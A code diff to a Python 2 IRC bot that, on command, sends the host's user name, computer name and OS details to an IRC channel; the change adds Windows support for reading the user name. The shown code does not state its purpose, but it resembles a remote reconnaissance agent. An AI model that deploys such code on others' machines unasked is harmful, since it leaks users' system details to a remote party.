@@ -39,10 +39,14 @@ def ping(): # Function to respond to server pings
   ircsock.send('PONG :pingis\n')
 
 def getlogin(): # Function to get user name
-  print 'Sending message -- User name: ' + str(os.getlogin())
-  sendmsg(channel, 'User name: ' + str(os.getlogin()))  
+  if (str(platform.platform()))[0:3]=="Win": # If user is running Windows, get username from environment variable %USERNAME% instead
+    print 'Sending message -- User name: ' + str(os.getenv("USERNAME"))
+    sendmsg(channel, 'User name: ' + str(os.getenv("USERNAME"))) 
+  else:
+    print 'Sending message -- User name: ' + str(os.getlogin())
+    sendmsg(channel, 'User name: ' + str(os.getlogin()))   
 
-def sysinfo(): # Function to getlogin system information
+def sysinfo(): # Function to obtain system information
   print 'Sending system information'
   sendmsg(channel, 'Computer: ' + platform.uname()[1])
   sendmsg(channel, 'OS: ' + platform.platform()) 
@@ -96,7 +100,7 @@ def main():
       get_external_ip()
 
 if __name__ == '__main__':
-  if len(sys.argv) <> 5:  
+  if len(sys.argv) != 5:  
     usage()
     sys.exit(1)
   else:
